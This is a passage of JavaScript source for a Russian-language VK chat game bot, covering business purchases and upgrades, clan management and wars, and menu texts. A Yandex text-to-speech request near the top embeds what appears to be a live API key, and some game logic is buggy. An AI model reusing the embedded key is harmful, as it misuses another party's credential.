	https.get("https://tts.voicetech.yandex.net/generate?text=" + encodeURIComponent(`Поздравляю, беседа переименована в: "${message.$match[1]}", и кстати Гриша самый топовый кодер, Ха!`) + `&format=mp3&lang=ru-RU&speaker=ermil&speed=1.3&key=3b141899-4097-45c6-a00b-d449812e1ffa&emotion=Usual`, (stream) => { 
		stream.name = 'audio_message.ogg'; 
		message.sendAudioMessage(stream); 
		message.send({sticker_id:10349});
	}); 
});





const businesses = [[
{name: 'Хлебная лавка', cost: 50000, earn: 200, workers: 1, id: 1, icon: '🥖'},
{name: '5 Хлебных лавок', cost: 350000, earn: 1000, workers: 10, id: 1, icon: '🥖'},
{name: 'Небольшая сеть Хлебных Лавок', cost: 900000, earn: 2625, workers: 30, id: 1, icon: '🥖'},
{name: 'Средняя сеть Хлебных Лавок', cost: 1200000, earn: 3750, workers: 50, id: 1, icon: '🥖'},
{name: 'Лучшая Хлебная Лавка в стране', cost: 4000000, earn: 11000, workers: 200, id: 1, icon: '🥖'}
],

[
{name: 'Маленький ларёк', cost: 100000, earn: 700, workers: 1, id: 2, icon: '🏪'},
{name: 'Средний ларёк', cost: 500000, earn: 3700, workers: 5, id: 2, icon: '🏪'},
{name: 'Средняя сеть ларьков', cost: 950000, earn: 7725, workers: 40, id: 2, icon: '🏪'},
{name: 'Ларьки во всех городах страны', cost: 8000000, earn: 37450, workers: 150, id: 2, icon: '🏪'},
{name: 'Ларьки в каждой стране', cost: 17500000, earn: 79950, workers: 400, id: 2, icon: '🏪'}
],

[
{name: 'Закусочная', cost: 300000, earn: 2700, workers: 3, id: 3, icon: '🍷'},
{name: 'Общепит', cost: 450000, earn: 4350, workers: 7, id: 3, icon: '🍷'},
{name: 'Ресторан', cost: 450000, earn: 7400, workers: 15, id: 3, icon: '🍷'},
{name: 'Небольшая сеть ресторанов', cost: 4000000, earn: 19900, workers: 80, id: 3, icon: '🍷'},
{name: 'Лучшие рестораны в стране', cost: 11000000, earn: 47400, workers: 300, id: 3, icon: '🍷'}
],

[
{name: 'Прилавок', cost: 500000, earn: 4100, workers: 15, id: 4, icon: '🏫'},
{name: 'Магазин', cost: 1250000, earn: 9350, workers: 10, id: 4, icon: '🏫'},
{name: 'Сеть магазинов', cost: 3000000, earn: 23350, workers: 70, id: 4, icon: '🏫'},
{name: 'Сеть супермаркетов', cost: 20000000, earn: 109850, workers: 500, id: 4, icon: '🏫'}
],

[
{name: 'Завод в гараже', cost: 1500000, earn: 8800, workers: 5, id: 5, icon: '🏭'},
{name: 'Средний завод', cost: 3500000, earn: 13800, workers: 20, id: 5, icon: '🏭'},
{name: 'Сеть заводов', cost: 15000000, earn: 60800, workers: 200, id: 5, icon: '🏭'},
{name: 'Главные заводы страны', cost: 50000000, earn: 274800, workers: 1000, id: 5, icon: '🏭'}
],

[
{name: 'Каменная шахта', cost: 25000000, earn: 84700, workers: 50, id: 6, icon: '⛏'},
{name: 'Угольная шахта', cost: 50000000, earn: 117200, workers: 75, id: 6, icon: '⛏'},
{name: 'Золотая шахта', cost: 60000000, earn: 229700, workers: 200, id: 6, icon: '⛏'},
{name: 'Алмазная шахта', cost: 90000000, earn: 432700, workers: 360, id: 6, icon: '⛏'},
{name: 'Крупнейший алмазный карьер', cost: 200000000, earn: 709700, workers: 700, id: 6, icon: '⛏'}
],

[
{name: 'Домашний офис', cost: 80000000, earn: 229625, workers: 10, id: 7, icon: '🏢'},
{name: 'Средний офис',cost: 240000000,earn: 329175,workers: 60,id: 7,icon: '🏢'},
{name: 'Большой офис',cost: 240000000,earn: 614675,workers: 200,id: 7,icon: '🏢'},
{name: 'Офис-небоскрёб',cost: 1000000000,earn: 1227275,workers: 700,id: 7,icon: '🏢'}
],

[
{name: 'Разработчик игр',cost: 150000000,earn: 302000,workers: 5,id: 8,icon: '🕹'},
{name: 'Разработчик игр с приятелем',cost: 200000000,earn: 379500,workers: 10,id: 8,icon: '🕹'},
{name: 'Небольшая компания по созданию игр',cost: 750000000,earn: 1024500,workers: 50,id: 8,icon: '🕹'},
{name: 'Огромная компания По разработке Игр',cost: 5000000000,earn: 6749500,workers: 500,id: 8,icon: '🕹'}
],

[
{name: 'Нефтевышка',cost: 500000000,earn: 707000,workers: 8,id: 9,icon: '🏜'},
{name: 'Нефтеплатформа в море',cost: 750000000,earn: 1019000,workers: 20,id: 9,icon: '🏜'},
{name: 'Нефтеплатформа в океане',cost: 1250000000,earn: 4049000,workers: 50,id: 9,icon: '🏜'},
{name: '5 нефтеплатформ в океане',cost: 5000000000,earn: 15249000,workers: 250,id: 9,icon: '🏜'}
],

[
{name: 'Мини АЭС', cost: 800000000, earn: 1050700, workers: 40, id: 10, icon: '💡'},
{name: 'Средняя АЭС', cost: 1200000000, earn: 1496200, workers: 75, id: 10, icon: '💡'},
{name: 'АЭС с 5 энергоблоками', cost: 4250000000, earn: 3088700, workers: 300, id: 10, icon: '💡'},
{name: 'Крупнейшая АЭС', cost: 10000000000, earn: 34843700, workers: 650, id: 10, icon: '💡'}
]];


cm.hear(/(?:бизнесы)\s?([0-9]+)?$/i, async (message, bot) => {
	let a = acc.users[user_id(message.user)];
	if(!message.$match[1])
	{
		let text = `@id${a.id}(${a.prefix}), бизнесы:\n`;
		for(var i = 0; i < businesses.length; i++)
		{
			text += `${(a.business.length == 1 && a.business[0].id == i + 1) || (a.business.length == 2 && a.business[1].id == i + 1) ? '🔸' : '🔹'} ${i + 1}. ${businesses[i][0].name} - ${utils.sp(businesses[i][0].cost)}$\nПрибыль: ${utils.sp(businesses[i][0].earn)}$/час\n`;
		}
		return message.send(text + `\n Что бы купить бизнес, напишите "Бизнесы [Номер]"`);
	}

	if(a.business.length == 2) return message.send(`@id${a.id}(${a.prefix}), у Вас уже есть 2 бизнеса`);

	message.$match[1] = Number(message.$match[1]) - 1;
	const sell = businesses[message.$match[1]][0];
	if(sell == null) return;
	if(a.balance < sell.cost) return message.send(`@id${a.id}(${a.prefix}), недостаточно денег`);
	a.balance -= sell.cost;
	a.business.push({
		"id": message.$match[1] + 1,
		"upgrade": 1,
		"workers": 1,
		"moneys": 0
	});

	return message.send(`@id${a.id}(${a.prefix}), вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
});










cm.hear(/(?:бизнес)\s(?:снять)\s(.*)\s(.*)$/i, async (message, bot) => {
	let a = acc.users[user_id(message.user)];	
	message.$match[1] = Math.floor(Number(message.$match[1]));
	if(message.$match[1] < 1 || message.$match[1] > 2) return message.send(`@id${a.id}(${a.prefix}), пример: Бизнес снять [1 или 2] [количество]`);
	if(a.business.length < message.$match[1]) return message.send(`@id${a.id}(${a.prefix}), у Вас нет этого биизнеса`);
	message.$match[1]--;
	message.$match[2] = message.$match[2].replace(/(\.|\,)/ig, '');
	message.$match[2] = message.$match[2].replace(/(к|k)/ig, '000');
	message.$match[2] = message.$match[2].replace(/(м|m)/ig, '000000');
	message.$match[2] = message.$match[2].replace(/(все|всё)/ig, a.business[message.$match[1]].moneys);
	if(!Number(message.$match[2])) return;
	message.$match[2] = Math.floor(Number(message.$match[2]));
	if(message.$match[2] <= 0) return message.send(`@id${a.id}(${a.prefix}), укажите сумму.`);
	if(message.$match[2] > a.business[message.$match[1]].moneys) return message.send(`@id${a.id}(${a.prefix}), на счету бизнеса нет столько`);

	a.balance += message.$match[2];
	a.business[message.$match[1]].moneys -= message.$match[2];

	return message.send(`@id${a.id}(${a.prefix}), Вы сняли со счёта своего бизнеса ${utils.sp(message.$match[2])}$`);
});



cm.hear(/(?:бизнес)\s(\d)$/i, async (message) => {
	let a = acc.users[user_id(message.user)];
	message.$match[1] = Math.floor(Number(message.$match[1]));
	if(message.$match[1] < 1 || message.$match[1] > 2) return message.send(`@id${a.id}(${a.prefix}), пример: Бизнес [1 или 2]`);
	if(a.business.length < message.$match[1]) return message.send(`@id${a.id}(${a.prefix}), у Вас нет этого бизнеса`);
	message.$match[1]--;
	const biz = businesses[a.business[message.$match[1]].id - 1][a.business[message.$match[1]].upgrade - 1];

	return message.send(`@id${a.id}(${a.prefix}), статистика бизнеса "${biz.name}":
		💸 Прибыль: ${utils.sp(Math.floor(biz.earn / biz.workers * a.business[message.$match[1]].workers))}$/час
		💼 Рабочих: ${a.business[message.$match[1]].workers}/${biz.workers}
		💰 Баланс: ${utils.sp(a.business[message.$match[1]].moneys)}$

		${(businesses[a.business[message.$match[1]].id - 1][a.business[message.$match[1]].upgrade] != null ? "✅ Доступно улучшение! (" + utils.sp(businesses[a.business[message.$match[1]].id - 1][a.business[message.$match[1]].upgrade].cost) + "$)" : "") }`);
});


cm.hear(/(?:бизнес)\s(?:улучшить)\s([0-9]+)$/i, async (message) => {
	let a = acc.users[user_id(message.user)];
	message.$match[1] = Math.floor(Number(message.$match[1]));
	if(message.$match[1] < 1 || message.$match[1] > 2) return message.send(`@id${a.id}(${a.prefix}), пример: Бизнес улучшить [1 или 2]`);
	if(a.business.length < message.$match[1]) return message.send(`@id${a.id}(${a.prefix}), у Вас нет этого бизнеса`);
	message.$match[1]--;
	if(businesses[a.business[message.$match[1]].id - 1][a.business[message.$match[1]].upgrade] == null) return message.send(`${nick}, для вашего бизнеса нет улучшений!`);
	const cost = businesses[a.business[message.$match[1]].id - 1][a.business[message.$match[1]].upgrade].cost;
	if(cost > a.balance) return message.send(`@id${a.id}(${a.prefix}), у Вас недостаточно денег для улучшения!`);
	a.balance -= cost;
	a.business[message.$match[1]].upgrade++;

	return message.send(`@id${a.id}(${a.prefix}), Вы улучшили бизнес #${message.$match[1] + 1} за ${utils.sp(cost)}$`);
});


cm.hear(/(?:бизнес)\s(?:нанять)\s(.*)\s(.*)$/i, async (message, bot) => {
	let a = acc.users[user_id(message.user)];
	message.$match[1] = Math.floor(Number(message.$match[1]));
	message.$match[2] = Math.floor(Number(message.$match[2]));
	if(message.$match[1] < 1 || message.$match[1] > 2) return message.send(`@id${a.id}(${a.prefix}), пример: Бизнес нанять [1 или 2] [кол-во работников]`);
	if(a.business.length < message.$match[1]) return message.send(`@id${a.id}(${a.prefix}), у Вас нет этого бизнеса`);
	message.$match[1]--;
	if(a.business[message.$match[1]].workers + message.$match[2] > businesses[a.business[message.$match[1]].id - 1][a.business[message.$match[1]].upgrade - 1].workers) return message.send(`${nick}, в Вашем бизнесе не хватает места для рабочих.`);
	const cost = message.$match[2] * 0;
	if(cost > a.balance) return message.send(`@id${a.id}(${a.prefix}), у Вас недостаточно денег для покупки рабочих`);
	a.balance -= cost;
	a.business[message.$match[1]].workers += message.$match[2];

	return message.send(`@id${a.id}(${a.prefix}), Вы наняли ${message.$match[2]} рабочих для бизнеса #${message.$match[1] + 1}`);
});


cm.hear(/(?:бизнес)\s(?:продать)\s(.*)$/i, async (message, bot) => {
	let aa = acc.users[user_id(message.user)]  
	if(aa.business.length == 0) return message.send(`@id${aa.id}(${aa.prefix}), у Вас нет бизнеса`);
	if(message.$match[1] < 1 || message.$match[1] > 2) return message.send(`@id${aa.id}(${aa.prefix}), пример: Продать бизнес [1 или 2]`);
	if(aa.business.length < message.$match[1]) return message.send(`@id${aa.id}(${aa.prefix}), у Вас нет этого бизнеса`);
	message.$match[1]--;
	let a = Math.floor(businesses[aa.business[message.$match[1]].id - 1][aa.business[message.$match[1]].upgrade - 1].cost * 0.85);

	aa.balance += Math.floor(a);
	aa.business.splice(message.$match[1], 1);

	return message.send(`@id${aa.id}(${aa.prefix}), Вы продали свой бизнес за ${ utils.sp(a) }$`);
});

setInterval(async () => {
	for (a in acc.users) {
		for(let i = 0; i < acc.users[a].business.length; i++)
		{
			let biz = businesses[acc.users[a].business[i].id - 1][acc.users[a].business[i].upgrade - 1];
			acc.users[a].business[i].moneys += Math.floor(biz.earn / biz.workers * acc.users[a].business[i].workers)
		}
	}
}, 3600000);








updates.hear(/^(?:clan create|создать клан|addclan|клан создать)\s(.*)/i, message => {
	let a = acc.users[user_id(message.user)]
	let id = a.cid
	let name = message.$match[1];
	if(clans[a.cid]) return message.send(`У вас уже создан клан/Вы состоите в клане.`);
	if(a.balance < 500000000) return message.send(`Для создания клана, нужно иметь ${utils.sp(500000000)}$`)
		config.cid += 1
	if(!clans[config.cid]) {
		clans[config.cid] = {
			owner: a.number,
			users: {},
			number: config.cid,
			name: name,
			balance: 0,
			open: true,
			price: 100,
			people: 1,
			war: false,
			invites: {}
		}
		a.cid = config.cid;
		clans[config.cid].users[a.number] = {
			status: 2
		}
	}
	return message.send(`Клан под названием "${name}" успешно создан.\nБольше информации по команде "Clan help"`)
})
//------------------------------\\
updates.hear(/^(?:клан покинуть)/i,(message) => {
	let a = acc.users[user_id(message.user)]
	let id = a.cid;
	if(!clans[id]) return message.send(`Вы не состоите в клане!`);
	if (clans[id].users[a.number].status == 2) return message.send(`Вы не можете покинуть созданный вами клан!`);

	a.cid = false;
	delete clans[id].users[a.number];
	return message.send(`Вы успешно покинули клан!`);
});
//------------------------------\\
updates.hear(/^(?:Клан открыть)/i, (message) => {
	let a = acc.users[user_id(message.user)]
	let id = a.cid;
	if (!clans[id]) return message.send(`У Вас нет клана.`);
	if (clans[id].users[a.number].status < 2) return message.send(`Данная команда Вам не доступна.`);
	if (clans[id].open != false) return message.send(`Клан уже открыт.`)

		clans[id].open = true;

	return message.send(`Вы успешно открыли клан.`);
});
//------------------------------\\
updates.hear(/^(?:Клан закрыть)/i, (message) => {
	let a = acc.users[user_id(message.user)]
	let id = a.cid;
	if (!clans[id]) return message.send(`У Вас нет клана.`);
	if (clans[id].users[a.number].status < 2) return message.send(`Данная команда Вам не доступна.`);
	if (clans[id].open != true) return message.send(`Клан уже закрыт.`)

		clans[id].open = false;

	return message.send(`Вы успешно закрыли клан.`);
});
//------------------------------\\
updates.hear(/^(?:клан цена)\s?(.*)?/i, (message) => {
	let a = acc.users[user_id(message.user)]
	let id = a.cid;
	let amount = Number(message.$match[1]);  
	if (!amount) return message.send(`Вы не ввели цену`)
		if (!Number(amount)) return message.send(`Цена должна быть цифрового вида.`)
			if (!clans[id]) return message.send(`У Вас нет клана.`);
		if (clans[id].users[a.number].status < 2) return message.send(`Данная команда вам не доступна.`);

		clans[id].price = amount;
		return message.send(`Теперь что бы войти в клан, нужно ${utils.sp(amount)}$`);
	});
//------------------------------\\
updates.hear(/^(?:клан принять)\s?([0-9]+)?/i, (message) => {
	let a = acc.users[user_id(message.user)]
	let id = Number(message.$match[1]);
	let user = acc.users[id];    
	if(!clans[a.cid]) return message.send(`У Вас нет клана!`);
	if(!message.$match[1]) return message.send(`Укажите идентификатор пользователя.`);
	if(!clans[a.cid].invites[id]) return message.send(`Заявка с таким идентификатором не найдена.`);
	if(clans[a.cid].users[a.number].status < 1) return message.send(`Данная команда вам не доступна`);
	if(user.cid) return message.send(`💀 » Данный человек уже вступил в клан`);
	if(user.balance < clans[a.cid].price) return message.send(`💀 » У пользователя не хватает денег`);

	user.balance -= clans[a.cid].price;
	user.cid = a.cid;

	if(!clans[a.cid].users[id])
		clans[a.cid].users[id] = {
			status: 0
		};
		delete clans[a.cid].invites[id];
		return message.send(`Игрок "@id${acc.users[id].id} (${acc.users[id].prefix})" был принят в клан "${clans[a.cid].name}"`);
	});
//------------------------------\\
updates.hear(/^(?:клан заявки)/i, (message) => {
	let a = acc.users[user_id(message.user)]
	let id = a.cid;
	if (!clans[id]) return message.send(`Вы не состоите в клане`);
	let text = `Заявки на вступление в клан "${clans[a.cid].name}"\n`;
	if (clans[id].users[a.number].status < 1) return message.send(`Данная команда вам не доступна`);
	for(ids in clans[id].invites){

		text += `@id${acc.users[ids].id}(${acc.users[ids].prefix}) [ID: ${ids}] - Ждёт одобрения\n`;

	}
	return message.send(text);
});
//------------------------------\\
updates.hear(/^(?:Клан раздать)\s?(.*)?/i, (message) => {
	let a = acc.users[user_id(message.user)]
	message.$match[1] = utils.match(message.$match[1]);
	let id = a.cid;
	let sum = Math.round(message.$match[1] / clans[id].people);
	if(!message.$match[1]) return   
		if(clans[id].people < 3) return message.send(`В клане должно быть не меньше 3-х участников.`)
			if (clans[id].users[a.number].status < 2) return message.send(`Данная команда вам не доступна`)
				if(message.$match[1] > clans[id].balance) return message.send(`На балансе клана нет столько денег.`);

			clans[id].balance -= message.$match[1];

			for(ids in clans[id].users){
				acc.users[ids].balance += sum;
			}

			return message.send(`Деньги были поделены на всех участников.\nКаждый участник получил по ${utils.sp(sum)}`);
		});
//------------------------------\\
updates.hear(/^(?:клан вступить)\s?([0-9]+)?/i, (message) => {
	let a = acc.users[user_id(message.user)]
	let id = Number(message.$match[1]);
	if(!message.$match[1]) return
		if(clans[a.cid]) return message.send(`Вы уже состоите в клане "${clans[a.cid].name}"`);
	if(!clans[id]) return message.send(`💀 »  Данного клана не существует.`);

	if(!clans[id].open) {
		if(!clans[id].invites)
			clans[id].invites = {}

		if(!clans[id].invites[a.number])
			clans[id].invites[a.number] = {
				i: true
			};

			return message.reply(`Заявка на вступление была отправлена создателю клана.`);
		} else if (clans[id].open) {
			if (a.balance < clans[id].price) return message.send(`У Вас недостаточно денег, что бы войти в этот клан.`);
			a.balance -= clans[id].price;
			a.cid = id;
			clans[id].people += 1;
			clans[id].balance += clans[id].price;
			if(!clans[id].users[a.number]) {
				clans[id].users[a.number] = {
					status: 0
				}
			}

			return message.send(`Вы успешно вошли в клан "${clans[message.$match[1]].name}".\nБольше информации по команде "Clan Help"`);
		}
	});
//------------------------------\\
updates.hear(/^(?:клан название)\s?([^]+)?/i, (message) => {
	let a = acc.users[user_id(message.user)]
	if(!message.$match[1]) return;
	if(!clans[a.cid]) return message.send(`У Вас нет клана.`);
	if(clans[a.cid].users[a.number].status < 2) return message.send(`Данная команда Вам не доступна`);
	if(clans[a.cid].balance < 1000000000) return message.send(`На балансе клана нет столько денег.\nСмена названия клана стоит: ${utils.sp(1000000000)}$`);

	clans[a.cid].balance -= 10000;

	if(clans[a.cid]) {
		if(a.number != clans[a.cid].owner) return message.send(`Данная команда Вам не доступна`);
		if(a.number == clans[a.cid].owner) {
			clans[a.cid].name = message.$match[1];
			return message.send(`Вы успешно сменили название клана на "${clans[a.cid].name}"`);
		}
	}
});
//------------------------------\\
updates.hear(/^(?:clan|клан)$/i, (message) => {
	let a = acc.users[user_id(message.user)]
	let text = ``;
	let tipe = ``;
	if (!clans[a.cid]) return message.send(`У Вас нет клана.`);
	text += `👥 Участники:\n`;
	for (let id in clans[a.cid].users) {
		let people = acc.users[id];
		if (clans[a.cid].users[id].status == 2) text += `&#8195;👑 [id${acc.users[id].id}|${acc.users[id].prefix}] | Директор. [ID: ${acc.users[id].number}]\n`;
		if (clans[a.cid].users[id].status == 1) text += `&#8195;🔸 [id${acc.users[id].id}|${acc.users[id].prefix}] | Заместитель. [ID: ${acc.users[id].number}]\n`;
		if (clans[a.cid].users[id].status == 0) text += `&#8195;🔹 [id${acc.users[id].id}|${acc.users[id].prefix}] | Участник. [ID: ${acc.users[id].number}]\n`;
	}

	if (clans[a.cid].open == true) tipe += `Открытый.`
		if (clans[a.cid].open == false) tipe += `Закрытый.`

			return message.send(`
				🛡 Клан "${clans[a.cid].name}" [ID: ${clans[a.cid].number}]
				&#8195;👤 Создатель: [id${acc.users[clans[a.cid].owner].id}|${acc.users[clans[a.cid].owner].prefix}] 
				&#8195;🔅 Тип: ${tipe} 
				&#8195;💵 Цена за вход: ${utils.sp(clans[a.cid].price)}$
				&#8195;💰 Баланс клана: ${utils.sp(clans[a.cid].balance)}$

				${text}
				`);
	});
//------------------------------\\
updates.hear(/^(?:Клан выгнать)\s(.*)/i, (message) => {
	let a = acc.users[user_id(message.user)]
	if(!clans[a.cid]) return message.send(`Вы не состоите в клане`);
	if(clans[a.cid].users[a.number].status < 1) return message.send(`Данная команда вам не доступна`);
	if(!message.$match[1]) return;
	if(!clans[a.cid].users[message.$match[1]]) return message.send(`Этого участника нет в клане.`);
	if(!acc.users[message.$match[1]]) return;
	if(acc.users[message.$match[1]].cid != acc.users[a.number].cid) return message.send(`Этот участник находится в другом клане!`);
	if(clans[a.cid].users[message.$match[1]].status == 2) return message.send(`Нельзя выгнать создателя клана!`);
	if(acc.users[message.$match[1]].cid == false) return message.send(`Данный участник не состоит в клане.`);

	clans[a.cid].people -= 1;
	delete clans[a.cid].users[message.$match[1]];
	acc.users[message.$match[1]].cid = false;

	return message.send(`Участник "${acc.users[message.$match[1]].prefix}" был выгнан с клана.`);
});
//------------------------------\\
updates.hear(/^(?:Кланы)/i, (message) => {
	if (!clans) return message.send(`Кланов ещё нет.`);
	let text = '';
	text += `&#8195;🔸 Список кланов 🔸\n`;
	let tipe = '';
	for (let id in clans) {
		if (clans[id].open == true) tipe += `Открытый.`
			if (clans[id].open == false) tipe += `Закрытый.`
				let user = acc.users[clans[id].owner];
			text += `
			🛡 Клан "${clans[id].name}" [ID: ${clans[id].number}]
			&#8195;👑 Создал: [id${acc.users[clans[id].owner].id}|${acc.users[clans[id].owner].prefix}] 
			`+(clans[id].open === false ? `&#8195;🔅 Тип: Закрытый` : `&#8195;🔅 Тип: Открытый\n&#8195;💵 Цена входа: ${utils.sp(clans[id].price)}$`)+`
			&#8195;👥 Участников: ${clans[id].people}
			&#8195;💰 Баланс клана: ${utils.sp(clans[id].balance)}$ 
			➖➖➖➖➖➖➖➖
			`;
		}
		return message.send(text);
	});
//------------------------------\\
updates.hear(/^(?:клан повысить)\s([0-9]+)/i, (message) => {
	let a = acc.users[user_id(message.user)]
	if(!clans[a.cid]) return message.send(`У Вас нет клана`);
	if(clans[a.cid].users[a.number].status < 1) return message.send(`Данная команда вам не доступна.`);
	if(message.$match[1] == clans[a.cid].owner) return message.send(`Зачем себя повышать до Заместителя, если Вы Создатель?`)
		if(!message.$match[1]) return;
	if(acc.users[message.$match[1]].cid == false) return message.send(`Данный участник не состоит в клане.`);
	if(!acc.users[message.$match[1]]) return
		if(acc.users[message.$match[1]].cid != acc.users[a.number].cid) return message.send(`Данный участник состоит в другом клане`);

	clans[a.cid].users[message.$match[1]].status = 1;

	return message.send(`Участник "${acc.users[message.$match[1]].prefix}" был повышен до Заместителя.`);
});
//------------------------------\\
updates.hear(/^(?:клан понизить)\s([0-9]+)/i, (message) => {
	let a = acc.users[user_id(message.user)]
	if(!clans[a.cid]) return message.send(`У Вас нет клана`);
	if(clans[a.cid].users[a.number].status < 1) return message.send(`Данная команда вам не доступна.`);
	if(message.$match[1] == clans[a.cid].owner) return message.send(`Зачем себя понижать до участника, если Вы Создатель?`)
		if(!message.$match[1]) return;
	if(acc.users[message.$match[1]].cid == false) return message.send(`Данный участник не состоит в клане.`);
	if(!acc.users[message.$match[1]]) return
		if(acc.users[message.$match[1]].cid != acc.users[a.number].cid) return message.send(`Данный участник состоит в другом клане`);

	clans[a.cid].users[message.$match[1]].status = 0;

	return message.send(`Участник "${acc.users[message.$match[1]].prefix}" был понижен до участника.`);
});
//------------------------------\\
updates.hear(/^(?:клан напасть)\s?([0-9]+)/i, (message) => {
	let a = acc.users[user_id(message.user)]
	let id = Number(message.$match[1]); 
	if(!id) return message.send(`Вы не указали идентификатор клана`);
	if(id == a.cid) return message.send(`Нельзя нападать на свой клан...`);
	if(id == 1) return
		if(!clans[a.cid]) return message.send(`У Вас нет клана.`);
	if(!clans[id]) return;
	if(clans[a.cid].balance < 100000) return message.send(`На балансе клана должно быть не меньше 100.000$`)
		if(clans[id].balance < 100000) return message.send(`На балансе клана "${clans[id].name}" меньше 100.000$`)
			if(clans[a.cid].war > getUnix()) return message.send(`Вы уже нападали на клан\nНапасть ещё раз можно через ${unixStampLeft(clans[a.cid].war - Date.now())}`);
		if(clans[a.cid].users[a.number].status < 1) return message.send(`Данная команда вам не доступна`);

		clans[a.cid].war = getUnix() + 600000

		let win = rand(1,2);
		if(win == 1){
			clans[id].balance += Math.floor(clans[a.cid].balance / 1.50) 
			clans[a.cid].balance -= Math.floor(clans[a.cid].balance / 1.50);
			return message.send(`⚔ Клан ${clans[a.cid].name} напал на ${clans[id].name}
				🏆 Победу одержал клан "${clans[id].name}"
				💰 Смогли забрать: ${utils.sp(Math.floor(clans[a.cid].balance / 1.50))}$`);
		}else{
			clans[id].balance -= Math.floor(clans[id].balance / 1.50);
			clans[a.cid].balance += Math.floor(clans[id].balance / 1.50);
			return message.send(`⚔ Клан ${clans[a.cid].name} напал на ${clans[id].name}
				🏆 Победу одержал клан "${clans[a.cid].name}"
				💰 Смогли забрать: ${utils.sp(Math.floor(clans[id].balance / 1.50))}$`);
		}
	});
//------------------------------\\
updates.hear(/^(?:Clan help|кхелп|кпомощь)/i, message => {
	message.send(`Помощь по кланам:

		🔻 Клан - Покажет клан.
		🔻 Кланы - Покажет список кланов
		🔻 Клан создать [название] - Создать клан.
		🔻 Клан вступить [ID] - Вступить/отправить заявку
		🔻 Клан покинуть - Покинуть клан.
		🔻 Клан открыть - открыть клан для входа.
		🔻 Клан закрыть - закрыть клан для входа.
		🔻 Клан цена [цена] - Установить цену за вход в клан.
		🔻 Клан заявки - Посмотреть заявки на вступление в клан.
		🔻 Клан принять [ID] - Принять заявку на вступление в клан.
		🔻 Клан напасть [ID клана] - Напасть на клан.
		🔻 Клан раздать [сумма] - Поделить сумму на всех участников клана.
		🔻 Клан название [название] - сменить название клана (1.000.000.000$)
		🔻 Клан выгнать [ID] - Выгнать участника с клана.
		🔻 Клан повысить [ID] - Повысить участника до Заместителя.
		🔻 Клан понизить [ID] - Понизить Заместителя до участника.
		🔻 Клан работать - Отработать в клане.
		`)
})
//------------------------------\\
updates.hear(/^(?:клан работать)/i, message => {
	let a = acc.users[user_id(message.user)]
	let r = utils.random(10000, 300000);
	if(!clans[a.cid]) return message.send(`У Вас нет клана`);
	if(a.cjob > getUnix()) return message.send(`Вы уже работали.\n работать можно через ${unixStampLeft(a.cjob - Date.now())}`);

	a.cjob = getUnix() + 600000
	clans[a.cid].balance += r

	return message.send(`Вы успешно отработали, на счёт клана зачислено ${utils.sp(r)}$`);
});




vk.updates.hear(/^(?:chatid)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	return message.send(`ID Данного чата: ${message.chatId}`)
});








///////// == Команды/функции @vkbotevolk ===== [530903911] ================ ///////////////































// ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// //





vk.updates.hear(/^(?:pravila)/i,  (message) => { 
	return message.send(`
		🧤 Хамство в ответ игроку - выговор
		🧤 Слив приват админ инфы - бан/снятие

		🧤 Выдача валюты - выговор
		🧤 Оскорбления игроков - снятие

		🧤 Не адекватное поведение - снятие

		🧤 Бан без причины - выговор
		🧤 Мут без причины - выговор
		🧤 Варн без причины - выговор
		🧤 Оскорбления старших - выговор/мут 

		📍 Уважаемый администратор, просим Ваш не нарушать данные правила!

		`);
});
vk.updates.hear(/^(?:sssd)/i,  (message) => { 
	return message.send(`&#10004; ➾ Работаю! Uptime: ${uptime.days}:${uptime.hours}:${uptime.min}:${uptime.sec}\n✔ ➾ Наша группа: ${config.group_url}`);
});
vk.updates.hear(/^(?:01)/i,  (message) => { 
	return message.send(`Ошибка!`);
});
vk.updates.hear(/^(?:543543ку)/i,  (message) => { 
	return message.send(`профиль`);
});
vk.updates.hear(/^(?:@5436botded542278)/i,  (message) => { 
	return message.send(`профиль`);
});




vk.updates.hear(/^(?:магазин)$/i, (message) => {
	return message.send(`
		❄ 👉 ➾ Имущество: 

		┇🚤 Лодка 
		┇🏢 Дома 
		┇🐼 Питомцы 
		┇🎄 Елки 
		┇💻 Компьютеры 
		┇📱 Телефоны
		┇🚘  Машины 
		┇✈  Самолеты 
		┇🚁  Вертолеты 
		┇🏢  Бизнесы 
		┇🏢  Статистика `, { attachment: "photo-178754644_456239022" 
	}); 
});

vk.updates.hear(/^(?:игры|🛡 игры)$/i, (message) => {
	return message.send(`

		┇🌖 ➾ Рулетка [ставка] - Играть в рулетку 
		┇🎰 ➾ Казино <ставка> - казино


		┇💰 ➾ Сейф - взлом сейфа. 
		┇💥 ➾ Лотерея - на деньги. 
		┇🔫 ➾ Крутить - открыть оружейный кейс за 100к. 
		┇🔫 ➾ Стрела [id] [ставка] - назначить стрелу. 
		┇🔫 ➾ Принять - принять вызов.
		┇🔫 ➾ Сдаться - отказ от стрелы.

		┇💰➨ Сейф - взломать сейф  
		┇💥 ➨ Джекпот - джекпот в казино 
		┇🔫 ➾ Тир - тир 
		┇♻ ➾ Монетка [Орел/решка] [ставка] - Играть в монетку ( ⚠ Сложная игра ) 
		┇✂ ➾ Суефа [камень/ножницы/бумага] [ставка] - Играть в суефа ( ⚠ Сложная игра ) 
		┇🎳 ➾ Боулинг [ставка] - играть в боулинг 
		┇🚀 ➾ Вкосмос - слетать в космос 
		┇🌚 ➾ Вабанк - сыграть вабанк 
		┇🌖 ➾ Ган - команды убийств 
		┇🌖 ➾ Рулетка [ставка] - Играть в рулетку 
		┇🎰➤ Казино <ставка> - казино. 
		┇👒➤ Азино <ставка> - казино. 
		┇📈➤ Акция <вверх/вниз> <ставка> - акции. 
		┇💵➤ Баланс - ваш баланс. 
		┇💸➤ Ставка <выше/ниже> <ставка> - ставки. 
		┇👓➤ Риск - Выиграть 1кк ( Стоимость 500к )  

		`);
});

vk.updates.hear(/^(?:Кейсы)$/i, (message) => {
	return message.send(`
		🔶 ● Дкейсы - Элитные донат-кейсы. 
		ᅠ 🔶 ● Фкейсы - Кейсы на $ 

		`);
});
vk.updates.hear(/^(?:Проми)$/i, (message) => {
	return message.send(`
		😇 Бесплатные промокоды на нашем оф. Сайте !

		`);
});
vk.updates.hear(/^(?:Обменник)$/i, (message) => {
	return message.send(`

		🆓 ► Мобменять [кол-во] - Продать метеорит 

		🆓 ► Зобменять [кол-во] - Продать золото

